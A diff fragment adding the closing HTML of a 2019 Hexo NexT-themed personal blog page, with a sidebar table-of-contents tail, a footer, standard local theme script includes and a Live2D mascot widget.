href="#🐼-Rewind"><span class="nav-number">3.2.</span> <span class="nav-text">🐼 Rewind</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#whyOS"><span class="nav-number">3.3.</span> <span class="nav-text">whyOS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mcgriddle"><span class="nav-number">3.4.</span> <span class="nav-text">mcgriddle</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jianghuxia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":160},"mobile":{"show":true}});</script></body>
+</html>
